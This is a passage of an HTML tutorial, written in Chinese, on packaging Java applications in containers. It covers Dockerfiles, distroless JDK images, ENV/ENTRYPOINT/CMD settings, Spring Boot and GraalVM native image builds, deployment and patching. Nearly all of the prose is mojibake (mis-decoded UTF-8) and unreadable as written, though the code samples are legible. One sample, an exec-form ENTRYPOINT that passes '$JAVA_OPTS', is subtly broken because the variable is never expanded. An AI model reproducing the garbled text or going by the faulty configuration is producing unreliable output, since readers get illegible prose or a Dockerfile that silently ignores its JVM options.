<p>ä¸ºåº”ç”¨ç¨‹åºç›‘å¬è¿æ¥è¯·æ±‚è€Œéœ€è¦<strong>æš´éœ²</strong>ï¼ˆ<code>EXPOSE</code>ï¼‰çš„ä»»ä½•ç‰¹å®šç«¯å£ï¼ˆå¦‚æœ‰å¿…è¦ï¼‰</p>
</li>
<li>
<p>åœ¨å®¹å™¨å¯åŠ¨æ—¶è¿è¡Œåº”ç”¨ç¨‹åºçš„<strong>å‘½ä»¤</strong>ï¼ˆ<code>CMD</code>ï¼‰</p>
</li>
</ul>
<p>åœ¨åŒ…å«æ‚¨çš„ Dockerfile å’Œ .jar æ–‡ä»¶çš„ç›®å½•ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">
docker build -t &lt;app-image-name&gt; .

</code></pre>
<p>è¯·æ³¨æ„ï¼Œåœ¨è¿è¡Œé•œåƒåˆ›å»ºå’Œå…¶ä»–å®¹å™¨å‘½ä»¤ä¹‹å‰ï¼Œdocker å®ˆæŠ¤è¿›ç¨‹ï¼ˆæˆ– Mac/Windows ä¸Šçš„ Docker Desktopã€Podman ç­‰ï¼‰å¿…é¡»æ­£åœ¨è¿è¡Œã€‚å¦å¤–ï¼Œä¸è¦å¿˜è®°å‘½ä»¤æœ«å°¾çš„ <code>.</code>ï¼›å®ƒæŒ‡çš„æ˜¯å¯ä»¥æ‰¾åˆ° Dockerfile çš„å½“å‰ç›®å½•ã€‚</p>
<p>ä»¥è¿™ç§æ–¹å¼è¿è¡Œç”Ÿæˆçš„åº”ç”¨ç¨‹åºå®¹å™¨ï¼Œç”¨æ‚¨ä¸Šé¢åˆ›å»ºçš„å®¹å™¨é•œåƒåç§°æ›¿æ¢ <code>&lt;app-image-name&gt;</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">
docker run -p 8080:8080 &lt;app-image-name&gt;

</code></pre>
<h3 data-id="heading-4">é€‰æ‹©æ— å‘è¡Œç‰ˆæ“ä½œç³»ç»Ÿ+JDK åŸºç¡€é•œåƒ</h3>
<p>å¯¹äºå¤§å¤šæ•°ç”¨ä¾‹ï¼Œåœ¨å¤§å°å’Œæ”»å‡»é¢æ–¹é¢å¯å®ç°çš„æœ€ä½³ä¼˜åŒ–å¯èƒ½ç”±"æ— å‘è¡Œç‰ˆ"åŸºç¡€é•œåƒæä¾›ã€‚è™½ç„¶æ— å‘è¡Œç‰ˆåŸºç¡€é•œåƒä¸­ç¡®å®åŒ…å«ä¸€ä¸ª Linux å‘è¡Œç‰ˆï¼Œä½†å®ƒå·²è¢«å‰¥ç¦»äº†ä»»ä½•éå½“å‰ç›®çš„ specifically ä¸éœ€è¦çš„æ–‡ä»¶ï¼Œç•™ä¸‹ä¸€ä¸ªå®Œå…¨ç²¾ç®€çš„æ“ä½œç³»ç»Ÿï¼Œå¯¹äºæ— å‘è¡Œç‰ˆ Java é•œåƒè€Œè¨€ï¼Œè¿˜åŒ…æ‹¬ JVMã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨æ— å‘è¡Œç‰ˆ Java åŸºç¡€é•œåƒçš„ Dockerfile ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
FROM mcr.microsoft.com/openjdk/jdk:21-distroless

COPY java-in-the-can-0.0.1-SNAPSHOT.jar /app.jar

EXPOSE 8080

CMD ["-Xmx256m", "-jar", "/app.jar"]

</code></pre>
<p>è¯·æ³¨æ„ï¼Œè¿™ä¸ªé’ˆå¯¹ Java ä¼˜åŒ–çš„åŸºç¡€é•œåƒé¢„å…ˆé…ç½®äº† <code>java</code> å‘½ä»¤çš„ <strong>ENTRYPOINT</strong>ï¼Œå› æ­¤ <strong>CMD</strong> æŒ‡ä»¤ç”¨äºä¸º JVM å¯åŠ¨å™¨è¿›ç¨‹æä¾›å‘½ä»¤è¡Œå‚æ•°ã€‚</p>
<h3 data-id="heading-5">ä½¿ç”¨å¤šé˜¶æ®µæ„å»ºæ¥å‡å°é•œåƒå¤§å°</h3>
<p>å¦‚æœæ‚¨æœ‰æ„å»ºæ‰€éœ€ä½†æœ€ç»ˆè¾“å‡ºä¸éœ€è¦çš„æ–‡ä»¶ï¼Œå¤šé˜¶æ®µæ„å»ºæä¾›äº†å‡å°å®¹å™¨é•œåƒå¤§å°çš„æ–¹æ³•ã€‚å°±æœ¬æ–‡å‚è€ƒè€Œè¨€ï¼Œæƒ…å†µå¹¶éå¦‚æ­¤ï¼Œå› ä¸º JVM ä»¥åŠåº”ç”¨ç¨‹åºçš„ <code>.jar</code> æ–‡ä»¶å’Œä¾èµ–é¡¹å·²ä¸ºé•œåƒåˆ›å»ºé¢„å…ˆé…ç½®å¥½äº†ã€‚</p>
<p>æ­£å¦‚æ‚¨å¯èƒ½æƒ³è±¡çš„é‚£æ ·ï¼Œåœ¨æŸäº›éå¸¸å¸¸è§çš„æƒ…å†µä¸‹ï¼Œè¿™å˜å¾—æœ‰åˆ©ã€‚é€šå¸¸ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡é…ç½®å¥½çš„æ„å»ºæµæ°´çº¿éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒï¼Œè¿™äº›æµæ°´çº¿åŸºäºæºä»“åº“ä¸Šçš„è§¦å‘å™¨æ¥åˆ›å»ºæ„ä»¶ã€‚è¿™æ˜¯å¤šé˜¶æ®µæ„å»ºçš„æœ€ä½³ç”¨ä¾‹ä¹‹ä¸€ï¼šæ„å»ºæµæ°´çº¿åˆ›å»ºä¸€ä¸ªå¸¦æœ‰é€‚å½“å·¥å…·çš„æ„å»ºå®¹å™¨ï¼Œä½¿ç”¨å®ƒæ¥åˆ›å»ºæ„ä»¶ï¼ˆä¾‹å¦‚ <code>.jar</code> æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ï¼‰ï¼Œç„¶åå°†è¿™äº›æ„ä»¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–°çš„å®¹å™¨é•œåƒä¸­ï¼Œè¯¥é•œåƒä¸åŒ…å«ç”Ÿäº§ç¯å¢ƒä¸éœ€è¦çš„é¢å¤–å·¥å…·ã€‚è¿™ä¸€ç³»åˆ—æ“ä½œå¤§è‡´ç±»ä¼¼äºæˆ‘ä»¬ä¹‹å‰æ‰‹åŠ¨å®Œæˆçš„æ“ä½œï¼Œä½†å®ç°äº†è‡ªåŠ¨åŒ–ï¼Œä»¥è·å¾—ä¸€è‡´å’Œæœ€ä¼˜çš„ç»“æœã€‚</p>
<h3 data-id="heading-6">ç®¡ç†ç¯å¢ƒå˜é‡</h3>
<p>æœ‰å¤šç§æ–¹æ³•å¯ä»¥å‘å®¹å™¨å’Œåº”ç”¨ç¨‹åºæä¾›è¾“å…¥å€¼ï¼Œç”¨äºå¯åŠ¨æˆ–æ‰§è¡Œã€‚ä¸€ä¸ªåº”è¯¥é‡‡ç”¨çš„è‰¯å¥½å®è·µæ˜¯ï¼Œå°½å¯èƒ½ä½¿ç”¨ <strong>ENV</strong>ã€<strong>ENTRYPOINT</strong> æˆ– <strong>CMD</strong> æŒ‡ä»¤åœ¨ Dockerfile æœ¬èº«ä¸­æŒ‡å®šæ‰€æœ‰å¯èƒ½çš„å€¼ã€‚æ‰€æœ‰è¿™äº›å€¼éƒ½å¯ä»¥åœ¨å®¹å™¨åˆå§‹åŒ–æ—¶æ ¹æ®éœ€è¦è¦†ç›–ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œè¦†ç›–ç°æœ‰ç¯å¢ƒå˜é‡æ—¶åº”è°¨æ…ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šä»¥æ„å¤–å’Œä¸è‰¯çš„æ–¹å¼æ”¹å˜åº”ç”¨ç¨‹åºè¡Œä¸ºã€‚</p>
<p>ä½¿ç”¨ <code>ENV</code> é…ç½® Java ç‰¹å®šé€‰é¡¹çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
ENV JAVA_OPTS="-Xmx512m -Xms256m"

</code></pre>
<p>ç›¸åŒçš„æ¦‚å¿µä¹Ÿé€‚ç”¨äºåº”ç”¨ç¨‹åºç‰¹å®šå˜é‡ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
ENV APP_GREETING="Greetings, Friend!"

</code></pre>
<p>ä½¿ç”¨ ENTRYPOINT é…ç½®åº”ç”¨ç¨‹åºç‰¹å®šå€¼çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
ENTRYPOINT ["java", "$JAVA_OPTS", "-jar", "your-app.jar"]

</code></pre>
<p>ä½¿ç”¨ CMD çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
CMD ["java", "-Xmx256m", "-jar", "/app.jar"]

</code></pre>
<p>æ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œ<strong>ENTRYPOINT</strong> å’Œ <strong>CMD</strong> éƒ½å¯ä»¥ç”¨æ¥æ‰§è¡Œ Java åº”ç”¨ç¨‹åºã€‚åƒæ‰€æœ‰å…¶ä»–æŠ€æœ¯ï¼ˆå’ŒéæŠ€æœ¯ï¼‰é€‰é¡¹ä¸€æ ·ï¼Œè¿™ä¸¤ç§æŒ‡ä»¤å„æœ‰ä¼˜ç¼ºç‚¹ã€‚å¦‚æœæ“ä½œå¾—å½“ï¼Œä¸¤è€…éƒ½ä¼šä½¿æ‚¨çš„ Java åº”ç”¨ç¨‹åºè¿è¡Œã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼ŒJava åº”ç”¨ç¨‹åºä½¿ç”¨ <strong>CMD</strong> æŒ‡ä»¤ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºå¯ä»¥å¤„ç†æ“ä½œç³»ç»Ÿä¿¡å·ï¼Œç”¨äºæ”¯æŒçš„é’©å­æœºåˆ¶ï¼ˆä¾‹å¦‚ï¼Œ<code>SIGTERM</code> å¯¹åº” <code>java.lang.Runtime.addShutdownHook</code>ï¼‰ã€‚å½“ç„¶ï¼Œè¿™å¹¶éç»å¯¹å¿…è¦ï¼Œå¹¶ä¸”å¯ä»¥ï¼ˆä¹Ÿç»å¸¸ï¼‰ä½¿ç”¨ <strong>ENTRYPOINT</strong> å’Œ <strong>CMD</strong> æ¥ä¿ƒè¿›è¿è¡Œæ—¶å‚æ•°ä¼ é€’ï¼Œä»¥æä¾›/è¦†ç›–ç‰¹å®šè¡Œä¸ºã€‚è¿™ä¸¤è€…å¹¶ä¸äº’æ–¥ã€‚</p>
<h2 data-id="heading-7">ä½¿ç”¨ SPRING BOOT æ’ä»¶è¿›è¡Œå®¹å™¨åŒ–</h2>
<p>å¦‚æœæ‚¨ä½¿ç”¨ Spring Boot å¼€å‘ Java åº”ç”¨ç¨‹åºï¼Œå®¹å™¨åŒ–ä¼šç®€å•å¾—å¤šã€‚æ— è®ºä½¿ç”¨ Maven è¿˜æ˜¯ Gradle ä½œä¸ºé¡¹ç›®æ„å»ºå·¥å…·ï¼Œåˆ›å»ºå®¹å™¨é•œåƒéƒ½åƒæ‰§è¡Œä¸€ä¸ªé¢„å®šä¹‰çš„ç›®æ ‡ä¸€æ ·ç®€å•ã€‚</p>
<ul>
<li>å¦‚æœä½¿ç”¨ <strong>Maven</strong> ä½œä¸ºæ„å»ºå·¥å…·ï¼Œæ‚¨å¯ä»¥é€šè¿‡è°ƒç”¨ <code>build-image</code> ç›®æ ‡æ¥åˆ›å»ºåŒ…å«åº”ç”¨ç¨‹åºçš„å®¹å™¨é•œåƒï¼š</li>
</ul>
<p><code>./mvnw spring-boot:build-image</code></p>
<ul>
<li>å¦‚æœä½¿ç”¨ <strong>Gradle</strong> ä½œä¸ºæ„å»ºå·¥å…·ï¼Œæ‚¨å¯ä»¥é€šè¿‡è°ƒç”¨ <code>bootBuildImage</code> ç›®æ ‡æ¥åˆ›å»ºåŒ…å«åº”ç”¨ç¨‹åºçš„å®¹å™¨é•œåƒï¼š</li>
</ul>
<p><code>./gradlew bootBuildImage</code></p>
<p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè‡ªå®šä¹‰é•œåƒåˆ›å»ºï¼ˆä¾‹å¦‚ï¼Œé•œåƒå±‚å®šä¹‰ï¼‰æ—¢ä¸å¿…è¦ä¹Ÿä¸å¯å–ï¼Œä½†å¦‚æœéœ€è¦è¿™æ ·åšï¼Œè¯·å‚é˜… Spring Boot Maven æˆ– Gradle æ’ä»¶æ–‡æ¡£ä¸­çš„"æ‰“åŒ… OCI é•œåƒ"éƒ¨åˆ†ã€‚</p>
<h2 data-id="heading-8">ä¸ºåŸç”Ÿåº”ç”¨ç¨‹åºæ„å»ºå®¹å™¨é•œåƒ</h2>
<p>å¼€å‘äººå‘˜å¯ä»¥é€‰æ‹©ä½¿ç”¨ JVM æˆ–ä½œä¸ºåŸç”Ÿçš„ã€æ“ä½œç³»ç»Ÿç‰¹å®šçš„å¯æ‰§è¡Œæ–‡ä»¶æ¥äº¤ä»˜ Java åº”ç”¨ç¨‹åºã€‚ä»¥ä¸‹éƒ¨åˆ†æä¾›äº†ä¸€äº›å…³äºé€‰æ‹©çš„è€ƒè™‘å› ç´ ï¼Œä»¥åŠå¦‚æœæ‚¨å†³å®šä½¿ç”¨åŸç”Ÿåº”ç”¨ç¨‹åºæ„å»ºå®¹å™¨é•œåƒï¼Œå¦‚ä½•ä»¥æœ€å°çš„ä»£ä»·å®ç°ã€‚</p>
<h3 data-id="heading-9">ä½¿ç”¨ GRAALVM çš„ JAVA åŸç”Ÿå¯æ‰§è¡Œæ–‡ä»¶</h3>
<p>GraalVM æ”¯æŒåˆ›å»ºåŸç”Ÿå¯æ‰§è¡Œæ–‡ä»¶/äºŒè¿›åˆ¶ Java åº”ç”¨ç¨‹åºï¼Œåœ¨æ„å»ºæ—¶æ‰§è¡Œæ‰€æœ‰ç¼–è¯‘å’Œä¼˜åŒ–ï¼Œè€Œä¸æ˜¯åˆ©ç”¨ JVM åœ¨è¿è¡Œåº”ç”¨ç¨‹åºå­—èŠ‚ç æ—¶è¿›è¡Œä¸€äº›ä¼˜åŒ–ã€‚</p>
<p>ä¸æ‰€æœ‰é€‰æ‹©ä¸€æ ·ï¼Œéœ€è¦æƒè¡¡åˆ©å¼Šã€‚ç¼–è¯‘ä¸ºå­—èŠ‚ç ä¸åŸç”Ÿå¯æ‰§è¡Œæ–‡ä»¶æ˜¯ç§’ä¸åˆ†é’Ÿçš„é—®é¢˜ï¼Œå¹¶ä¸” JVM æ‰§è¡Œçš„è¿è¡Œæ—¶ä¼˜åŒ–åœ¨åŸç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ä¸­æ¶ˆå¤±äº†ï¼Œå› ä¸ºä»£ç æ— æ³•åœ¨è¿è¡Œæ—¶åŠ¨æ€é‡å†™ï¼ˆè¿™æ˜¯ JVM å¯ç”¨çš„ä¸€ä¸ªç‰¹æ€§ï¼‰ã€‚</p>
<p>åŸç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ä¼˜äºåŸºäº JVM çš„ Java åº”ç”¨ç¨‹åºçš„åœ°æ–¹åœ¨äºæ–‡ä»¶å¤§å°ã€å†…å­˜éœ€æ±‚å’Œå¯åŠ¨æ—¶é—´ã€‚åŸç”Ÿåº”ç”¨ç¨‹åºè¦å°å¾—å¤šï¼Œéœ€è¦çš„èµ„æºæ›´å°‘ï¼Œä¸éœ€è¦ JVM å­˜åœ¨ï¼Œå¹¶ä¸”å¯åŠ¨é€Ÿåº¦æ˜¾è‘—æ›´å¿«ã€‚è¿™åœ¨è®¸å¤šç”Ÿäº§ç¯å¢ƒä¸­æ˜¯éå¸¸é‡è¦çš„è€ƒè™‘å› ç´ ï¼Œå› ä¸ºè¾ƒå°çš„åº”ç”¨ç¨‹åºï¼ˆåŠå…¶å®¹å™¨ï¼‰ä¼šé™ä½å¹³å°èµ„æºéœ€æ±‚ï¼Œå¹¶ä¸”ä»¥æ¯«ç§’è€Œä¸æ˜¯å‡ ç§’è¡¡é‡çš„å¯åŠ¨æ—¶é—´å¯ä»¥å¢åŠ å¯ç”¨æ€§ã€å¯æ‰©å±•æ€§ä»¥åŠç³»ç»Ÿè®¾è®¡å’Œéƒ¨ç½²çš„é€‰é¡¹ï¼Œä»è€Œå¯ä»¥æ˜¾è‘—èŠ‚çœæˆæœ¬ã€‚</p>
<p>æ ¹æ®æ‚¨çš„æ¡†æ¶å’Œå·¥å…·é€‰æ‹©ï¼Œæœ‰å‡ ç§æ„å»ºå®Œå…¨å¯æ‰§è¡Œçš„ã€æ“ä½œç³»ç»ŸåŸç”Ÿçš„ Java åº”ç”¨ç¨‹åºçš„é€‰é¡¹ã€‚ç„¶è€Œï¼Œä¸€æ—¦æ‚¨æœ‰äº†åŸç”Ÿå¯æ‰§è¡Œæ–‡ä»¶/äºŒè¿›åˆ¶åº”ç”¨ç¨‹åºï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªç±»ä¼¼ä»¥ä¸‹çš„ Dockerfile ä½œä¸ºæ‚¨çš„åŸç”Ÿåº”ç”¨ç¨‹åºå®¹å™¨é•œåƒçš„æ¨¡æ¿ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
FROM alpine:latest

WORKDIR /app

COPY java-in-the-can /app/

EXPOSE 8080

CMD ["/app/java-in-the-can"]

</code></pre>
<p>å¦‚æœæ‚¨ä½¿ç”¨ Spring Bootï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ GraalVM Maven æˆ– Gradle æ’ä»¶ï¼Œé€šè¿‡ä¸€æ¡å‘½ä»¤å°†æ‚¨çš„åº”ç”¨ç¨‹åºç¼–è¯‘ä¸ºæ“ä½œç³»ç»ŸåŸç”Ÿåº”ç”¨ç¨‹åºå¹¶åˆ›å»ºå®¹å™¨é•œåƒã€‚</p>
<p><strong>MAVEN</strong></p>
<p>é¦–å…ˆï¼Œå°†æ­¤ä¾èµ–é¡¹æ·»åŠ åˆ°æ‚¨çš„ <code>pom.xml</code> çš„ <code>&lt;build&gt;&lt;plugins&gt;</code> éƒ¨åˆ†å¹¶ä¿å­˜æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-xml" lang="xml">
<span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.graalvm.buildtools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>native-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>

</code></pre>
<p>è¦æ„å»ºåŸç”Ÿåº”ç”¨ç¨‹åºå’Œå®¹å™¨é•œåƒï¼Œä»æ‚¨çš„é¡¹ç›®æ ¹ç›®å½•è¿è¡Œæ­¤å‘½ä»¤ï¼š</p>
<p><code>./mvnw -Pnative spring-boot:build-image</code></p>
<p><strong>GRADLE</strong></p>
<p>ç±»ä¼¼åœ°ï¼Œå°†æ­¤ä¾èµ–é¡¹æ·»åŠ åˆ°æ‚¨çš„ <code>build.gradle</code> æ–‡ä»¶çš„ <code>plugins {}</code> éƒ¨åˆ†å¹¶ä¿å­˜ï¼š</p>
<p><code>id 'org.graalvm.buildtools.native'</code></p>
<p>è¦æ„å»ºåŸç”Ÿåº”ç”¨ç¨‹åºå’Œå®¹å™¨é•œåƒï¼Œä»æ‚¨çš„é¡¹ç›®æ ¹ç›®å½•è¿è¡Œæ­¤å‘½ä»¤ï¼š</p>
<p><code>./gradlew bootBuildImage</code></p>
<h2 data-id="heading-10">å…³äºå‡å°é•œåƒå¤§å°å’ŒåŠ å¿«å¯åŠ¨æ—¶é—´çš„è€ƒè™‘å› ç´ </h2>
<p>æ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œä¸Šè¿°å„èŠ‚çš„é¡ºåºæ€»ä½“ä¸Šè¶‹å‘äºç”Ÿäº§æ›´ç²¾ç®€ã€å¯åŠ¨æ›´å¿«çš„å®¹å™¨é•œåƒã€‚è®¸å¤šå†³ç­–å¯èƒ½æ¶‰åŠç»„ç»‡æ ‡å‡†æˆ–é€‰æ‹©ï¼ˆä¾‹å¦‚ï¼Œéƒ¨ç½²æ ‡å‡†ï¼‰ï¼Œè¿™äº›æ ‡å‡†æˆ–é€‰æ‹©ä¼šä½¿å¤©å¹³å€¾å‘äºæˆ–åå¯¹æŸäº›é€‰æ‹©ï¼Œä½†ä¸€èˆ¬æ¥è¯´ï¼Œå®¹å™¨é•œåƒä¼˜åŒ–çš„è·¯å¾„éµå¾ªä»¥ä¸‹é¡ºåºï¼š</p>
<ol>
<li>
<p>é€‰æ‹©æ›´å°çš„åŸºç¡€é•œåƒï¼ˆæ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆå’Œ JVMï¼‰</p>
</li>
<li>
<p>é€‰æ‹©å¸¦æœ‰ JVM çš„æ— å‘è¡Œç‰ˆé•œåƒ</p>
</li>
<li>
<p>å¦‚æœæ‚¨çš„å·¥å…·é“¾ï¼ˆä¾‹å¦‚ Spring Bootï¼‰å…è®¸ï¼Œåˆ©ç”¨ä¸“é—¨æ„å»ºçš„å·¥å…·</p>
</li>
<li>
<p>åˆ©ç”¨å¸¦æœ‰åŸç”Ÿå¯æ‰§è¡Œåº”ç”¨ç¨‹åºçš„ç²¾ç®€å‘è¡Œç‰ˆæˆ–æ— å‘è¡Œç‰ˆé•œåƒ</p>
</li>
</ol>
<h2 data-id="heading-11">å®¹å™¨ä¸­ JAVA åº”ç”¨ç¨‹åºçš„éƒ¨ç½²ç­–ç•¥</h2>
<p>æ‚¨çš„åº”ç”¨ç¨‹åºçš„é‡è¦è€ƒè™‘å› ç´ è¶…å‡ºäº†å°†å…¶æ‰“åŒ…æˆåº”ç”¨ç¨‹åºå®¹å™¨é•œåƒçš„èŒƒå›´ã€‚æ¥ä¸‹æ¥æ˜¯éƒ¨ç½²å’Œç»´æŠ¤å†³ç­–ï¼Œè¿™äº›å†³ç­–å¯¹äºæ‚¨çš„åº”ç”¨ç¨‹åºè¿›å…¥å¹¶ä¿æŒåœ¨ç”Ÿäº§ç¯å¢ƒè‡³å…³é‡è¦ã€‚</p>
<h3 data-id="heading-12">å•å®¹å™¨éƒ¨ç½²</h3>
<p>å¯¹äºåŸºæœ¬ä¸Šæ˜¯è‡ªåŒ…å«çš„åº”ç”¨ç¨‹åºï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒå¯ä»¥åƒå•ä¸ªå‘½ä»¤ä¸€æ ·ç®€å•ï¼Œå‰ææ˜¯éƒ¨ç½²ç›®æ ‡å·²å‡†å¤‡å¥½æ¥å—å®¹å™¨åŒ–åº”ç”¨ç¨‹åºã€‚å³ä½¿åœ¨åº”ç”¨ç¨‹åºéƒ¨ç½²ä¹‹å‰å¿…é¡»åˆ›å»ºæ”¯æŒèµ„æºçš„æƒ…å†µä¸‹ï¼Œè¿™é€šå¸¸ä¹Ÿæ„å‘³ç€é€šè¿‡å‘½ä»¤è¡Œæˆ– Web é—¨æˆ·å‘å‡ºå°‘é‡æŒ‡ä»¤ã€‚å½“åº”ç”¨ç¨‹åºåŒ…å«å¤šä¸ªå®¹å™¨éƒ¨ç½²æ—¶ï¼Œè¿›ç¨‹é—´ä¾èµ–å…³ç³»å¯èƒ½è¦æ±‚æŒ‰ç‰¹å®šé¡ºåºéƒ¨ç½²å®¹å™¨ï¼Œä»¥ç¡®ä¿å¯ç”¨æ€§æˆ–æœ€å°åŒ–æ³¢åŠ¨æˆ– chatterã€‚ä¸ºäº†å®ç°è¿™äº›ç›®æ ‡ï¼Œéœ€è¦è¿›è¡Œç¼–æ’éƒ¨ç½²ã€‚</p>
<h3 data-id="heading-13">ç¼–æ’éƒ¨ç½²</h3>
<p>ç¼–æ’éƒ¨ç½²å¯èƒ½æ¯”å•å®¹å™¨éƒ¨ç½²å¤æ‚å¾—å¤šï¼Œå¹¶ç›¸åº”åœ°æä¾›æ›´å¤šåŠŸèƒ½ã€‚ç”±äºè¿™ä¸¤ä¸ªç‰¹ç‚¹ï¼Œä¸å•å®¹å™¨éƒ¨ç½²ç›¸æ¯”ï¼Œç¼–æ’éƒ¨ç½²å¯èƒ½æœ‰æ›´å¤šå¹³å°å±‚çº§å€¼å¾—è€ƒè™‘ã€‚è¿™äº›å±‚çº§èŒƒå›´ä»æä¾›å¹¿æ³›çµæ´»æ€§å¹¶ç›¸åº”éœ€è¦å¼€å‘äººå‘˜ä»˜å‡ºæ›´é«˜æ°´å¹³åŠªåŠ›çš„è¾ƒä½å±‚çº§ Kubernetes å¹³å°ï¼Œåˆ°å®Œæˆå¤§é‡ç¹é‡å·¥ä½œä»¥å®‰å…¨é…ç½®å’Œé›†æˆå¤šä¸ªå®¹å™¨å’Œ/æˆ–æœåŠ¡çš„å®Œæ•´å¹³å°ã€‚</p>
<p>æ‚¨é€‰æ‹©çš„ç›®æ ‡å¹³å°å°†å†³å®šæ‚¨å¯¹éƒ¨ç½²å·¥å…·ï¼ˆä¾‹å¦‚ï¼Œè„šæœ¬ã€é—¨æˆ·ã€åŸºç¡€è®¾æ–½é…ç½®å·¥å…·ï¼‰çš„é€‰æ‹©ã€‚éå¸¸ç¬¼ç»Ÿåœ°è¯´ï¼Œæ‚¨é€‰æ‹©çš„å¹³å°ç›®æ ‡åº”è¯¥æ˜¯èƒ½å¤Ÿéƒ¨ç½²å’Œç»´æŠ¤æ‚¨çš„åº”ç”¨ç¨‹åºåŠå…¶ç›¸å…³æœåŠ¡çš„æœ€ç®€å•çš„å¹³å°ã€‚å…¶ä»–é‡è¦çš„è€ƒè™‘å› ç´ åŒ…æ‹¬åº”ç”¨ç¨‹åºæ‰€æœ‰å¿…éœ€å®¹å™¨/æœåŠ¡çš„éƒ¨ç½²ç›®æ ‡ä¹‹é—´çš„æ¯”è¾ƒæˆæœ¬ã€æ‚¨ç»„ç»‡å·²å»ºç«‹çš„å®è·µ/æµæ°´çº¿ç­‰ã€‚</p>
<h2 data-id="heading-14">æ„å»ºæ”¯æŒæŒç»­æ‰“è¡¥ä¸çš„ JAVA åº”ç”¨ç¨‹åº</h2>
<p>ç”Ÿäº§éƒ¨ç½²åœ¨åº”ç”¨ç¨‹åºä¸Šçº¿åå¹¶æœªå®Œæˆï¼›å¼€å‘äººå‘˜å¿…é¡»ç¡®ä¿åº”ç”¨ç¨‹åºä¿æŒå®‰å…¨ã€æœ€æ–°å’Œå¯ç”¨ã€‚å…³é”®çš„è¡¥ä¸ç®¡ç†è€ƒè™‘å› ç´ åŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p><strong>å®šæœŸè¡¥ä¸</strong> â€“ ä¸ºå¸¸è§„è¡¥ä¸ï¼ˆä¾‹å¦‚ï¼Œæ¯æœˆæˆ–æ¯å­£åº¦ï¼‰å»ºç«‹ä¸€ä¸ªæ— ä¸­æ–­ã€å¯é¢„æµ‹çš„é¢‘ç‡ï¼Œä»¥æ›´æ–°åº“å’Œä¾èµ–é¡¹</p>
</li>
<li>
<p><strong>ç´§æ€¥è¡¥ä¸</strong> â€“ æä¾›å…³äºä½•æ—¶éœ€è¦ç´§æ€¥è¡¥ä¸çš„æŒ‡å¯¼ï¼Œé€šå¸¸æ˜¯ä¸ºäº†åº”å¯¹å…³é”®æ¼æ´æˆ–ç´§æ€¥å®‰å…¨æ›´æ–°</p>
</li>
</ul>
<p>å®¹å™¨é•œåƒä¸­éœ€è¦æ‰“è¡¥ä¸çš„ç»„ä»¶åŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p>åŸºç¡€æ“ä½œç³»ç»Ÿå®¹å™¨é•œåƒ</p>
</li>
<li>
<p>é™„åŠ çš„æ“ä½œç³»ç»ŸåŒ…ï¼ˆå¦‚æœé€‚ç”¨ï¼‰</p>
</li>
<li>
<p>åº”ç”¨ç¨‹åºè¿è¡Œæ—¶ï¼ˆä¾‹å¦‚ï¼ŒJVM ç‰ˆæœ¬ï¼Œå¦‚æœæœªåŒ…å«åœ¨åŸºç¡€é•œåƒä¸­ï¼‰</p>
</li>
<li>
<p>åº”ç”¨ç¨‹åºä¾èµ–é¡¹/åº“</p>
</li>
<li>
<p>åº”ç”¨ç¨‹åºæ€§èƒ½ç›‘æ§ï¼ˆAPMï¼‰ä»£ç†äºŒè¿›åˆ¶æ–‡ä»¶</p>
</li>
</ul>
<p>ç”±å¼€å‘äººå‘˜åŠå…¶ç»„ç»‡æ¥å†³å®šå¹¶ä¸¥æ ¼ç»´æŠ¤ä¸€ä¸ªä¿æŠ¤åº”ç”¨ç¨‹åºã€ç³»ç»ŸåŸºç¡€è®¾æ–½å’Œæ•°æ®çš„è¡¥ä¸ç­–ç•¥ã€‚è¯·å‚è€ƒæ­¤æŒ‡å—æ¥å¸®åŠ©åˆ¶å®šæ‚¨çš„å…·ä½“ç­–ç•¥ã€‚</p>
<h2 data-id="heading-15">ç»“è®º</h2>
